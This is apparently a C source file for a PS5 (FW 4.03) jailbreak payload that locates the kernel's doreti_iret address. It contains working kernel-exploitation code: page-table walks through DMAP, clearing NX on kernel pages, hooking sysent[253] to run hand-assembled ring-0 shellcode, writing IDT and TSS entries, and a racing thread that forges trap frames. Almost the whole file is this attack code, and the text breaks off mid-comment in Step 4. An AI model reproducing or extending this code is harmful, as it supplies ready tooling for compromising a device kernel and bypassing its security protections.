/*
 * PS5 doreti_iret Discovery Tool - FW 4.03
 *
 * Standalone payload implementing flatz's doreti_iret discovery technique.
 * This finds the doreti_iret address (kernel iret instruction) without
 * reading XOM-protected ktext, using the #GP + non-canonical RIP trick.
 *
 * Strategy (from flatz's porting guide):
 *   1. Set up a dedicated IST stack for #GP (int 13) in the TSS
 *   2. From a writer thread, overwrite the saved trap frame on the IST
 *      stack to make the kernel think the crash was in userspace
 *   3. In the main thread (pinned to the TSS's CPU), use sigreturn to
 *      load a non-canonical RIP, causing #GP on the kernel's iret
 *   4. The overwritten trap frame lets the crash arrive as a userspace
 *      signal (SIGBUS), and the signal handler reads mc_rip = doreti_iret
 *
 * Prerequisites: jailbreak via umtx2 + etaHEN, kernel R/W via DMAP.
 *
 * Usage: python3 send_elf.py <ps5_ip> --name hv_research2 hv_research2.elf
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <ucontext.h>
#include <sys/types.h>
#include <sys/mman.h>

#include <ps5/kernel.h>

/* ─── Notification helper ─── */

typedef struct {
    char useless1[45];
    char message[3075];
} notify_request_t;

int sceKernelSendNotificationRequest(int, notify_request_t*, size_t, int);

static void notify(const char *msg) {
    notify_request_t req;
    memset(&req, 0, sizeof(req));
    strncpy(req.message, msg, sizeof(req.message) - 1);
    sceKernelSendNotificationRequest(0, &req, sizeof(req), 0);
}

/* ─── Direct memory allocation ─── */

int sceKernelAllocateDirectMemory(off_t searchStart, off_t searchEnd,
                                  size_t len, size_t alignment,
                                  int memoryType, off_t *physAddrOut);
int sceKernelMapDirectMemory(void **addr, size_t len, int prot,
                             int flags, off_t directMemoryStart,
                             size_t alignment);

#define SCE_KERNEL_WB_ONION    0
#define SCE_KERNEL_PROT_CPU_RW 0x03

/* ─── Kernel struct offsets ─── */

#define OFFSET_PROC_P_VMSPACE    0x200
#define OFFSET_PMAP_PM_PML4      0x020
#define SYSENT_STRIDE            0x30   /* 48 bytes per sysent entry */

/* ─── Page table bits ─── */

#define PTE_PRESENT   (1ULL << 0)
#define PTE_PS        (1ULL << 7)
#define PTE_PA_MASK   0x000FFFFFFFFFF000ULL
#define MAX_SAFE_PA   0x800000000ULL

/* ─── ps5-kstuff offsets for FW 4.03 ─── */

#define KSTUFF_IDT_OFF         0x64cdc80ULL
#define KSTUFF_TSS_OFF         0x64d0830ULL
#define KSTUFF_PCPU_OFF        0x64d2280ULL
#define KSTUFF_SYSENTS_OFF     0x1709c0ULL
#define KSTUFF_DORETI_IRET_OFF (-0x9cf84cLL)  /* known value for verification */

/* ─── Global state ─── */

static uint64_t g_dmap_base = 0;
static uint64_t g_kdata_base = 0;
static uint64_t g_ktext_base = 0;
static uint64_t g_fw_version = 0;
static uint64_t g_cr3_phys = 0;

/* ─── doreti_iret discovery result ─── */

static volatile uint64_t g_doreti_iret_addr = 0;
static volatile int g_signal_received = 0;

/* ─── DMAP base discovery ─── */

static int discover_dmap_base(void) {
    uint64_t proc, vmspace, pmap_addr;
    uint64_t pm_pml4;

    proc = kernel_get_proc(getpid());
    if (!proc) {
        printf("[-] Failed to get proc\n");
        return -1;
    }

    vmspace = kernel_getlong(proc + OFFSET_PROC_P_VMSPACE);
    if (!vmspace) {
        printf("[-] Failed to get vmspace\n");
        return -1;
    }

    pmap_addr = vmspace + 0xC0;
    pm_pml4 = kernel_getlong(pmap_addr + OFFSET_PMAP_PM_PML4);

    if (!pm_pml4) {
        printf("[-] Failed to get pml4\n");
        return -1;
    }
    printf("[*] pm_pml4 = 0x%lx\n", pm_pml4);

    /* Try known CR3 offsets to derive DMAP base */
    for (uint64_t cr3_off = 0x1000000; cr3_off < 0x40000000; cr3_off += 0x200000) {
        /* Validate: DMAP base should be page-aligned, in upper canonical range */
        uint64_t dmap = pm_pml4 - cr3_off;
        if ((dmap & 0xFFF) != 0) continue;
        if (dmap < 0xFFFF800000000000ULL) continue;

        /* Try reading a known MMIO register via this DMAP candidate */
        uint64_t test_val;
        if (kernel_copyout(dmap + 0xE0500000, &test_val, 8) == 0) {
            g_dmap_base = dmap;
            g_cr3_phys = cr3_off;
            printf("[+] DMAP base discovered: 0x%lx (cr3_offset=0x%lx)\n",
                   g_dmap_base, g_cr3_phys);
            return 0;
        }
    }

    /* Fallback: try common PS5 DMAP bases */
    printf("[!] Could not discover DMAP via pmap, trying common bases...\n");
    static const uint64_t common_dmaps[] = {
        0xFFFF800000000000ULL, 0xFFFFE00000000000ULL,
        0xFFFFE2C000000000ULL, 0xFFFF801800000000ULL,
    };
    for (unsigned i = 0; i < sizeof(common_dmaps)/sizeof(common_dmaps[0]); i++) {
        uint64_t test_val;
        if (kernel_copyout(common_dmaps[i] + 0xE0500000, &test_val, 8) == 0) {
            g_dmap_base = common_dmaps[i];
            printf("[+] DMAP base found via fallback: 0x%lx\n", g_dmap_base);
            return 0;
        }
    }
    printf("[-] Failed to discover DMAP base\n");
    return -1;
}

static int init_fw_offsets(void) {
    g_fw_version = kernel_get_fw_version() & 0xFFFF0000;
    g_kdata_base = KERNEL_ADDRESS_DATA_BASE;
    g_ktext_base = KERNEL_ADDRESS_TEXT_BASE;

    printf("[*] FW version: 0x%lx\n", g_fw_version);
    printf("[*] Kernel data base: 0x%lx\n", g_kdata_base);
    printf("[*] Kernel text base: 0x%lx\n", g_ktext_base);
    return 0;
}

/* ─── Page table walk ─── */

static uint64_t va_to_pa_quiet(uint64_t va) {
    if (!g_cr3_phys || !g_dmap_base) return 0;

    uint64_t e;
    kernel_copyout(g_dmap_base + g_cr3_phys + ((va >> 39) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 30) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    if (e & PTE_PS) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 21) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    if (e & PTE_PS) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 12) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    return (e & PTE_PA_MASK) | (va & 0xFFF);
}

/* Verbose version for diagnostics */
static uint64_t va_to_pa(uint64_t va) {
    if (!g_cr3_phys || !g_dmap_base) {
        printf("[!] va_to_pa: no CR3 or DMAP base\n");
        return 0;
    }

    uint64_t e;
    kernel_copyout(g_dmap_base + g_cr3_phys + ((va >> 39) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) { printf("[!] PML4E not present for 0x%lx\n", va); return 0; }

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 30) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) { printf("[!] PDPTE not present for 0x%lx\n", va); return 0; }
    if (e & PTE_PS) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 21) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) { printf("[!] PDE not present for 0x%lx\n", va); return 0; }
    if (e & PTE_PS) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 12) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) { printf("[!] PTE not present for 0x%lx\n", va); return 0; }
    return (e & PTE_PA_MASK) | (va & 0xFFF);
}

/* ─── Sysent-based ring-0 code execution ─── */

/*
 * Execute arbitrary shellcode in ring 0 via sysent hook.
 * Pattern: write shellcode to kdata cave, clear NX in PTE,
 * hook sysent[253] → cave, call syscall(253), restore.
 *
 * shellcode must use sysent calling convention:
 *   RDI = td, RSI = uap (both ignored)
 *   return via RET, eax = return value
 *   caller-saved regs can be clobbered
 */
static int exec_ring0(uint8_t *shellcode, int sc_len, uint64_t sysent_kva) {
    /* Target: kdata_base + 0x200 (after cave trampoline area) */
    uint64_t target_kva = g_kdata_base + 0x200;
    uint64_t target_pa = va_to_pa_quiet(target_kva);
    if (!target_pa) {
        printf("[-] exec_ring0: cave PA lookup failed\n");
        return -1;
    }

    /* Walk guest PT to find PTE for target page */
    uint64_t walk_e, walk_pa;
    walk_pa = g_cr3_phys + ((target_kva >> 39) & 0x1FF) * 8;
    kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
    if (!(walk_e & PTE_PRESENT)) return -1;

    walk_pa = (walk_e & PTE_PA_MASK) + ((target_kva >> 30) & 0x1FF) * 8;
    kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
    if (!(walk_e & PTE_PRESENT)) return -1;

    walk_pa = (walk_e & PTE_PA_MASK) + ((target_kva >> 21) & 0x1FF) * 8;
    kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
    if (!(walk_e & PTE_PRESENT)) return -1;

    uint64_t pte_pa;
    uint64_t orig_pte;
    if (walk_e & PTE_PS) {
        /* 2MB page — PDE is final */
        pte_pa = walk_pa;
        orig_pte = walk_e;
    } else {
        /* 4KB page — walk to PT level */
        walk_pa = (walk_e & PTE_PA_MASK) + ((target_kva >> 12) & 0x1FF) * 8;
        kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
        if (!(walk_e & PTE_PRESENT)) return -1;
        pte_pa = walk_pa;
        orig_pte = walk_e;
    }

    /* Clear NX (bit 63) and G (bit 8) */
    uint64_t new_pte = orig_pte & ~((1ULL << 63) | (1ULL << 8));
    kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);

    /* Save original bytes and write shellcode */
    uint8_t backup[512];
    if (sc_len > (int)sizeof(backup)) { printf("[-] shellcode too large\n"); return -1; }
    kernel_copyout(g_dmap_base + target_pa, backup, sc_len);
    kernel_copyin(shellcode, g_dmap_base + target_pa, sc_len);

    /* Hook sysent[253] → target_kva */
    uint64_t s253_kva = sysent_kva + 253ULL * SYSENT_STRIDE;
    uint64_t s253_pa = va_to_pa_quiet(s253_kva);
    uint8_t s253_orig[SYSENT_STRIDE];
    kernel_copyout(g_dmap_base + s253_pa, s253_orig, SYSENT_STRIDE);

    uint64_t s253_call_pa = va_to_pa_quiet(s253_kva + 8);
    kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);

    int32_t narg_zero = 0;
    uint64_t s253_narg_pa = va_to_pa_quiet(s253_kva);
    kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);

    /* Execute */
    errno = 0;
    long ret = syscall(253);
    int err = errno;

    /* Restore sysent immediately */
    kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);

    /* Restore kdata content */
    kernel_copyin(backup, g_dmap_base + target_pa, sc_len);

    /* Restore PTE */
    kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);

    printf("    ring0: ret=%ld, errno=%d\n", ret, err);
    return (int)ret;
}

/* ─── Find sysent table ─── */

static uint64_t find_sysent(void) {
    /* First try the known kstuff offset */
    uint64_t kstuff_sysent = g_kdata_base + KSTUFF_SYSENTS_OFF;
    uint64_t pa = va_to_pa_quiet(kstuff_sysent);
    if (pa) {
        /* Verify first 7 entries' narg values:
         * nosys(0), exit(1), fork(0), read(3), write(3), open(3), close(1) */
        static const int expected[] = {0, 1, 0, 3, 3, 3, 1};
        int match = 1;
        for (int i = 0; i < 7 && match; i++) {
            uint64_t ent_pa = va_to_pa_quiet(kstuff_sysent + (uint64_t)i * SYSENT_STRIDE);
            if (!ent_pa) { match = 0; break; }
            int32_t narg;
            kernel_copyout(g_dmap_base + ent_pa, &narg, 4);
            if (narg != expected[i]) match = 0;
        }
        if (match) {
            printf("[+] Sysent at kstuff offset: kdata+0x%lx\n", (unsigned long)KSTUFF_SYSENTS_OFF);
            return kstuff_sysent;
        }
    }

    /* Fallback: scan kdata */
    printf("[*] Scanning kdata for sysent...\n");
    static const int expected[] = {0, 1, 0, 3, 3, 3, 1};
    uint8_t blk[4096];
    for (uint64_t pg = 0; pg < 0x4000000; pg += 4096) {
        uint64_t kva = g_kdata_base + pg;
        uint64_t ppa = va_to_pa_quiet(kva);
        if (!ppa) continue;
        if (kernel_copyout(g_dmap_base + ppa, blk, 4096) != 0) continue;

        for (int boff = 0; boff <= 4096 - SYSENT_STRIDE * 7; boff += 8) {
            int match = 1;
            for (int i = 0; i < 7 && match; i++) {
                int32_t narg;
                memcpy(&narg, &blk[boff + i * SYSENT_STRIDE], 4);
                if (narg != expected[i]) match = 0;
            }
            if (match) {
                uint64_t call0;
                memcpy(&call0, &blk[boff + 8], 8);
                if (call0 >= g_ktext_base && call0 < g_ktext_base + 0x2000000) {
                    printf("[+] Sysent found at kdata+0x%lx\n", (unsigned long)pg + boff);
                    return kva + boff;
                }
            }
        }
    }
    printf("[-] Sysent not found\n");
    return 0;
}

/* ─── Verify sysent by narg cross-check ─── */

static int verify_sysent(uint64_t sysent_kva) {
    static const struct { int num; int narg; } checks[] = {
        {20, 0}, {37, 2}, {54, 3}, {59, 3}, {73, 2}, {74, 3},
        {165, 2}, {202, 6}, {477, 6}, {304, 1}, {305, 1}, {308, 2},
    };
    int ok = 0, total = 0;
    for (unsigned i = 0; i < sizeof(checks)/sizeof(checks[0]); i++) {
        uint64_t pa = va_to_pa_quiet(sysent_kva + (uint64_t)checks[i].num * SYSENT_STRIDE);
        if (!pa) continue;
        int32_t narg;
        kernel_copyout(g_dmap_base + pa, &narg, 4);
        total++;
        if (narg == checks[i].narg) ok++;
    }
    printf("    Sysent narg cross-check: %d/%d\n", ok, total);
    return (ok == total && total >= 10);
}

/* ─── Test ring-0 execution ─── */

static int test_ring0(uint64_t sysent_kva) {
    /*
     * Minimal test: write magic to shared buffer, return 0.
     *   movabs $result_dmap_kva, %rax
     *   movabs $magic, %rdx
     *   mov %rdx, (%rax)
     *   xor %eax, %eax
     *   ret
     */

    /* Allocate a shared buffer for ring-0 output */
    off_t dmem_phys;
    int ret = sceKernelAllocateDirectMemory(0, 0x400000000ULL,
                                            0x4000, 0x4000,
                                            SCE_KERNEL_WB_ONION, &dmem_phys);
    if (ret != 0) {
        printf("[-] AllocateDirectMemory failed: %d\n", ret);
        return -1;
    }
    void *buf = NULL;
    ret = sceKernelMapDirectMemory(&buf, 0x4000, SCE_KERNEL_PROT_CPU_RW,
                                   0, dmem_phys, 0x4000);
    if (ret != 0) {
        printf("[-] MapDirectMemory failed: %d\n", ret);
        return -1;
    }
    memset(buf, 0, 0x4000);

    /* Find the CPU physical address of our buffer via page table walk */
    uint64_t buf_pa = va_to_pa_quiet((uint64_t)buf);
    if (!buf_pa) {
        printf("[-] Buffer PA lookup failed\n");
        return -1;
    }
    uint64_t buf_kva = g_dmap_base + buf_pa;
    printf("[*] Shared buffer: user=0x%lx, PA=0x%lx, DMAP_KVA=0x%lx\n",
           (unsigned long)buf, (unsigned long)buf_pa, (unsigned long)buf_kva);

    /* Build shellcode */
    uint8_t sc[64];
    int p = 0;
    uint64_t magic = 0xDEAD000052494E47ULL;

    /* movabs $buf_kva, %rax */
    sc[p++] = 0x48; sc[p++] = 0xB8;
    memcpy(&sc[p], &buf_kva, 8); p += 8;

    /* movabs $magic, %rdx */
    sc[p++] = 0x48; sc[p++] = 0xBA;
    memcpy(&sc[p], &magic, 8); p += 8;

    /* mov %rdx, (%rax) */
    sc[p++] = 0x48; sc[p++] = 0x89; sc[p++] = 0x10;

    /* xor %eax, %eax */
    sc[p++] = 0x31; sc[p++] = 0xC0;

    /* ret */
    sc[p++] = 0xC3;

    printf("[*] Testing ring-0 execution (%d bytes)...\n", p);
    exec_ring0(sc, p, sysent_kva);

    /* Check result */
    uint64_t result;
    memcpy(&result, buf, 8);
    if (result == magic) {
        printf("[+] RING-0 EXECUTION CONFIRMED! Magic=0x%lx\n", (unsigned long)result);
        return 0;
    } else {
        printf("[-] Ring-0 test failed. Buffer=0x%lx (expected 0x%lx)\n",
               (unsigned long)result, (unsigned long)magic);
        return -1;
    }
}

/* ─── Read IDT and TSS ─── */

struct idt_entry {
    uint16_t offset_lo;
    uint16_t selector;
    uint8_t  ist;
    uint8_t  type_attr;
    uint16_t offset_mid;
    uint32_t offset_hi;
    uint32_t reserved;
};

static uint64_t idt_get_handler(const struct idt_entry *e) {
    return (uint64_t)e->offset_lo |
           ((uint64_t)e->offset_mid << 16) |
           ((uint64_t)e->offset_hi << 32);
}

static int read_idt(uint64_t idt_kva, struct idt_entry *out, int count) {
    uint64_t pa = va_to_pa_quiet(idt_kva);
    if (!pa) return -1;
    kernel_copyout(g_dmap_base + pa, out, count * sizeof(struct idt_entry));
    return 0;
}

/*
 * AMD64 TSS layout (relevant fields):
 *   +0x00: reserved (4 bytes)
 *   +0x04: RSP0 (8 bytes) — ring-0 stack pointer
 *   +0x0C: RSP1 (8 bytes)
 *   +0x14: RSP2 (8 bytes)
 *   +0x1C: reserved (8 bytes)
 *   +0x24: IST1 (8 bytes)
 *   +0x2C: IST2 (8 bytes)
 *   +0x34: IST3 (8 bytes)
 *   +0x3C: IST4 (8 bytes)
 *   +0x44: IST5 (8 bytes)
 *   +0x4C: IST6 (8 bytes)
 *   +0x54: IST7 (8 bytes)
 */
#define TSS_RSP0_OFF    0x04
#define TSS_IST_BASE    0x24   /* IST1 starts here */
#define TSS_IST(n)      (TSS_IST_BASE + ((n) - 1) * 8)  /* IST1..IST7 */

/* ================================================================
 * Phase A: doreti_iret Discovery
 *
 * This implements flatz's technique to find the kernel iret instruction
 * address without reading XOM-protected ktext.
 *
 * The technique exploits the fact that iret with a non-canonical RIP
 * causes #GP in the kernel. By setting up a custom IST stack for #GP
 * and overwriting the trap frame to look like a userspace crash, we
 * can catch the #GP as a regular signal and read the faulting RIP
 * from the mcontext — which is the address of doreti_iret.
 *
 * Theory of operation:
 *
 * 1. Allocate a page for a dedicated #GP IST stack.
 *
 * 2. Write the IST stack address into TSS IST3 (or whichever IST
 *    slot #GP currently uses, or a free one that we configure #GP
 *    to use by modifying its IDT entry).
 *
 * 3. Set up a writer thread that continuously writes {0x43, 0x202, 0}
 *    (user CS, RFLAGS with IF set, and zero low RSP) to the IST stack
 *    at offset -32 from the top. This overwrites the mc_cs and
 *    mc_rflags fields in the trap frame that #GP pushes, making the
 *    kernel think the fault happened in userspace.
 *
 * 4. In the main thread, call sigreturn (via setcontext) to load an
 *    mcontext with a non-canonical mc_rip (e.g., 0xDEAD000000000000).
 *    The kernel tries to IRET to this address, triggering #GP.
 *
 * 5. Because the writer thread has overwritten cs/rflags, the kernel
 *    treats this as a userspace fault and delivers SIGBUS.
 *
 * 6. In the SIGBUS handler (running on sigaltstack), read mc_rip
 *    from the signal's mcontext — this is doreti_iret.
 *
 * IMPORTANT: The writer thread must be writing continuously and fast
 * enough to win the race between the #GP being pushed to the IST
 * stack and the kernel reading the trap frame. In practice, the
 * overwrite window is generous because the kernel reads the trap
 * frame multiple times during exception handling.
 * ================================================================ */

/* Writer thread state */
struct writer_ctx {
    volatile int      running;
    volatile int      stop;
    uint64_t          write_addr;    /* DMAP KVA to write the overwrite payload */
};

/*
 * Overwrite payload: 20 bytes starting at IST_TOP - 32
 *
 * The x86-64 iret frame pushed by the CPU on #GP is:
 *   [IST_TOP - 8]   SS       (8 bytes)
 *   [IST_TOP - 16]  RSP      (8 bytes)
 *   [IST_TOP - 24]  RFLAGS   (8 bytes)
 *   [IST_TOP - 32]  CS       (8 bytes)
 *   [IST_TOP - 40]  RIP      (8 bytes)  ← this is doreti_iret (untouched)
 *   [IST_TOP - 48]  ErrorCode (8 bytes)
 *
 * We overwrite CS, RFLAGS, and low 4 bytes of RSP:
 *   CS      = 0x43 (user code segment selector)
 *   RFLAGS  = 0x202 (IF set, reserved bit 1 set)
 *   RSP[0:3]= 0x00000000 (low 4 bytes of RSP)
 *
 * This makes the kernel think the #GP happened in user mode
 * (CS=0x43 is ring 3), so it delivers SIGBUS instead of panicking.
 *
 * Note: We DON'T touch RIP (at IST_TOP-40), which retains the
 * doreti_iret address pushed by the CPU.
 */

static void *writer_thread_func(void *arg) {
    struct writer_ctx *ctx = (struct writer_ctx *)arg;

    /* The 20-byte payload: {CS=0x43, RFLAGS=0x202, RSP_low=0} */
    uint8_t payload[20];
    memset(payload, 0, sizeof(payload));

    uint64_t cs_val = 0x43;        /* user CS */
    uint64_t rflags_val = 0x202;   /* IF + reserved bit 1 */
    uint32_t rsp_low = 0;          /* low 4 bytes of RSP */

    memcpy(&payload[0], &cs_val, 8);
    memcpy(&payload[8], &rflags_val, 8);
    memcpy(&payload[16], &rsp_low, 4);

    ctx->running = 1;

    /* Spam the overwrite as fast as possible */
    while (!ctx->stop) {
        kernel_copyin(payload, ctx->write_addr, 20);
    }

    return NULL;
}

/* SIGBUS handler — catches the redirected #GP */
static void sigbus_handler(int sig, siginfo_t *info, void *uctx) {
    ucontext_t *uc = (ucontext_t *)uctx;
    mcontext_t *mc = &uc->uc_mcontext;

    /* mc_rip is the address where the fault occurred.
     * Since the kernel pushed the iret frame before our overwrite took
     * effect, the RIP field contains doreti_iret. */
    g_doreti_iret_addr = (uint64_t)mc->mc_rip;
    g_signal_received = sig;

    printf("[SIGBUS handler] sig=%d, mc_rip=0x%lx\n",
           sig, (unsigned long)g_doreti_iret_addr);
    fflush(stdout);

    /* Fix up the context to resume execution safely.
     * Set RIP to a safe location — we'll use a small trampoline
     * that just returns to the main code. For now, just set a flag
     * and let the main thread handle cleanup.
     *
     * We can't easily "return" from here to the original sigreturn
     * context (it was intentionally non-canonical). Instead, use
     * siglongjmp or set mc_rip to a known safe userspace address.
     */

    /* Terminate the process cleanly by jumping to _exit.
     * The original context is intentionally broken (non-canonical RIP),
     * so we can't return to it. */
    _exit(0);
}

/* Alternative: SIGSEGV handler (in case the kernel delivers SIGSEGV instead) */
static void sigsegv_handler(int sig, siginfo_t *info, void *uctx) {
    ucontext_t *uc = (ucontext_t *)uctx;
    mcontext_t *mc = &uc->uc_mcontext;

    g_doreti_iret_addr = (uint64_t)mc->mc_rip;
    g_signal_received = sig;

    printf("[SIGSEGV handler] sig=%d, mc_rip=0x%lx\n",
           sig, (unsigned long)g_doreti_iret_addr);
    fflush(stdout);

    _exit(0);
}

/*
 * Build ring-0 shellcode to write a value to a kernel address.
 * Used to modify TSS IST entries and IDT gates from ring 0.
 *
 * Shellcode (sysent calling convention):
 *   movabs $dst_kva, %rax
 *   movabs $value, %rdx
 *   mov %rdx, (%rax)
 *   xor %eax, %eax
 *   ret
 */
static int build_write64_shellcode(uint8_t *buf, int bufmax,
                                    uint64_t dst_kva, uint64_t value) {
    int p = 0;
    if (bufmax < 32) return -1;

    /* movabs $dst_kva, %rax */
    buf[p++] = 0x48; buf[p++] = 0xB8;
    memcpy(&buf[p], &dst_kva, 8); p += 8;

    /* movabs $value, %rdx */
    buf[p++] = 0x48; buf[p++] = 0xBA;
    memcpy(&buf[p], &value, 8); p += 8;

    /* mov %rdx, (%rax) */
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x10;

    /* xor %eax, %eax */
    buf[p++] = 0x31; buf[p++] = 0xC0;

    /* ret */
    buf[p++] = 0xC3;

    return p;
}

/*
 * Build ring-0 shellcode to write 16 bytes to a kernel address.
 * Used to modify IDT gate entries (which are 16 bytes).
 *
 * Shellcode (sysent calling convention):
 *   movabs $dst_kva, %rax
 *   movabs $val_lo, %rdx    ; first 8 bytes
 *   mov %rdx, (%rax)
 *   movabs $val_hi, %rdx    ; second 8 bytes
 *   mov %rdx, 8(%rax)
 *   xor %eax, %eax
 *   ret
 */
static int build_write128_shellcode(uint8_t *buf, int bufmax,
                                     uint64_t dst_kva,
                                     uint64_t val_lo, uint64_t val_hi) {
    int p = 0;
    if (bufmax < 48) return -1;

    /* movabs $dst_kva, %rax */
    buf[p++] = 0x48; buf[p++] = 0xB8;
    memcpy(&buf[p], &dst_kva, 8); p += 8;

    /* movabs $val_lo, %rdx */
    buf[p++] = 0x48; buf[p++] = 0xBA;
    memcpy(&buf[p], &val_lo, 8); p += 8;

    /* mov %rdx, (%rax) */
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x10;

    /* movabs $val_hi, %rdx */
    buf[p++] = 0x48; buf[p++] = 0xBA;
    memcpy(&buf[p], &val_hi, 8); p += 8;

    /* mov %rdx, 8(%rax) */
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x50; buf[p++] = 0x08;

    /* xor %eax, %eax */
    buf[p++] = 0x31; buf[p++] = 0xC0;

    /* ret */
    buf[p++] = 0xC3;

    return p;
}

/*
 * Build an IDT gate entry from components.
 * Returns the 16-byte gate descriptor as two uint64_t values.
 */
static void build_idt_gate(uint64_t handler, uint16_t selector,
                           uint8_t ist, uint8_t type_attr,
                           uint64_t *out_lo, uint64_t *out_hi) {
    struct idt_entry gate;
    memset(&gate, 0, sizeof(gate));
    gate.offset_lo  = (uint16_t)(handler & 0xFFFF);
    gate.selector   = selector;
    gate.ist        = ist & 0x7;
    gate.type_attr  = type_attr;
    gate.offset_mid = (uint16_t)((handler >> 16) & 0xFFFF);
    gate.offset_hi  = (uint32_t)((handler >> 32) & 0xFFFFFFFF);
    gate.reserved   = 0;
    memcpy(out_lo, &gate, 8);
    memcpy(out_hi, (uint8_t *)&gate + 8, 8);
}

static void campaign_doreti_iret(void) {
    printf("\n=============================================\n");
    printf("  Phase A: doreti_iret Discovery\n");
    printf("  (flatz non-canonical RIP + #GP technique)\n");
    printf("=============================================\n\n");
    fflush(stdout);

    /* ── Step 1: Find and verify sysent ── */
    printf("[*] Step 1: Finding sysent table...\n");
    uint64_t sysent_kva = find_sysent();
    if (!sysent_kva) {
        printf("[-] Cannot proceed without sysent.\n");
        return;
    }
    if (!verify_sysent(sysent_kva)) {
        printf("[-] Sysent verification failed.\n");
        return;
    }
    printf("[+] Sysent verified.\n\n");
    fflush(stdout);

    /* ── Step 2: Test ring-0 execution ── */
    printf("[*] Step 2: Testing ring-0 execution...\n");
    if (test_ring0(sysent_kva) != 0) {
        printf("[-] Ring-0 execution failed. Cannot proceed.\n");
        return;
    }
    printf("[+] Ring-0 execution confirmed.\n\n");
    fflush(stdout);

    /* ── Step 3: Read IDT and TSS ── */
    printf("[*] Step 3: Reading IDT and TSS...\n");

    uint64_t idt_kva = g_kdata_base + KSTUFF_IDT_OFF;
    uint64_t tss_kva = g_kdata_base + KSTUFF_TSS_OFF;

    /* Verify IDT */
    struct idt_entry idt_entries[256];
    if (read_idt(idt_kva, idt_entries, 256) != 0) {
        printf("[-] Failed to read IDT.\n");
        return;
    }

    /* Validate: entry 0 (#DE) should be present */
    if (!(idt_entries[0].type_attr & 0x80)) {
        printf("[-] IDT validation failed (entry 0 not present).\n");
        return;
    }
    printf("    IDT at 0x%lx — validated.\n", (unsigned long)idt_kva);

    /* Parse #GP (int 13) entry */
    uint64_t gp_handler = idt_get_handler(&idt_entries[13]);
    uint8_t gp_ist = idt_entries[13].ist & 0x7;
    uint8_t gp_type = idt_entries[13].type_attr;
    uint16_t gp_selector = idt_entries[13].selector;
    printf("    #GP (int 13): handler=0x%lx, IST=%d, type=0x%02x, sel=0x%x\n",
           (unsigned long)gp_handler, gp_ist, gp_type, gp_selector);

    /* Print a few other important entries */
    static const struct { int vec; const char *name; } important[] = {
        {0, "#DE"}, {1, "#DB"}, {2, "NMI"}, {3, "#BP"},
        {8, "#DF"}, {13, "#GP"}, {14, "#PF"}, {244, "Xinvtlb"},
    };
    printf("\n    Key IDT entries:\n");
    for (unsigned i = 0; i < sizeof(important)/sizeof(important[0]); i++) {
        int v = important[i].vec;
        uint64_t h = idt_get_handler(&idt_entries[v]);
        printf("      [%3d] %-8s  handler=0x%lx  IST=%d",
               v, important[i].name, (unsigned long)h, idt_entries[v].ist & 7);
        if (h >= g_ktext_base && h < g_ktext_base + 0x2000000)
            printf("  (ktext+0x%lx)", (unsigned long)(h - g_ktext_base));
        printf("\n");
    }

    /* Read TSS */
    uint64_t tss_pa = va_to_pa_quiet(tss_kva);
    if (!tss_pa) {
        printf("[-] TSS VA→PA failed.\n");
        return;
    }

    uint8_t tss_data[0x68];
    kernel_copyout(g_dmap_base + tss_pa, tss_data, sizeof(tss_data));

    uint64_t rsp0;
    memcpy(&rsp0, &tss_data[TSS_RSP0_OFF], 8);
    printf("\n    TSS at 0x%lx (PA 0x%lx):\n", (unsigned long)tss_kva, (unsigned long)tss_pa);
    printf("      RSP0: 0x%lx\n", (unsigned long)rsp0);

    for (int ist = 1; ist <= 7; ist++) {
        uint64_t ist_val;
        memcpy(&ist_val, &tss_data[TSS_IST(ist)], 8);
        printf("      IST%d: 0x%lx%s\n", ist, (unsigned long)ist_val,
               ist_val ? "" : " (unused)");
    }
    printf("\n");
    fflush(stdout);

    /* ── Step 4: Allocate IST stack for #GP ── */
    printf("[*] Step 4: Allocating dedicated #GP IST stack...\n");

    /* We need a page of kernel-accessible memory for the IST stack.
     * Use a kdata cave page — allocate at kdata_base + 0x1000 (second page).
     * We've confirmed this page is DMAP-writable in previous sessions.
     *
     * Actually, we need the IST to point to a valid kernel VA whose
     * physical backing we can write to via DMAP. The kdata region works.
     *
     * IST stack top = kdata_base + 0x2000 (top of second page, 0-aligned mod 16).
     * Stack grows downward: the CPU pushes the iret frame below this.
     *
     * We can also use the allocator to get a fresh page and use its
     * DMAP address. But kdata pages are already kernel-mapped.
     */

    /* Use kdata_base + 0x1000 as the IST stack page.
     * IST stack top = kdata_base + 0x2000 (page boundary, 16-byte aligned).
